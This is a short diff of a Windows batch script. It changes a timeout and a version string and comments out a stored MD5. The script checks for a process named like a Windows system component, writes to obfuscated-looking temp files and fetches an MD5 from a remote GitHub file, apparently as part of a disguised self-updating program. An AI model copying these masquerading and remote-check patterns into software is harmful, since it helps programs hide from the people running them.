@@ -15,7 +15,7 @@ for /f "tokens=1 delims=," %%A in ('tasklist /fo csv /nh ^| findstr /i /c:"Prote
 :: Check if one or more instances are found
 if !instances! geq 2 (
     echo ProtectionWindowsHostProcess.exe is already running. Exiting batch...
-	timeout /t 2 /nobreak
+	timeout /t 3 /nobreak
     goto :EOF
 )
 
@@ -24,11 +24,11 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=39.8T"
+set "BATCHVERSION=40.8T"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
-set "RUNEVERYOFFICIALMD5=080407aae4149d7efbf05207d8fc6b66"
+::set "RUNEVERYOFFICIALMD5=080407aae4149d7efbf05207d8fc6b66"
 
 :retryruncallermd5
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/MD5FILES/RunEveryCallerMD5') do (
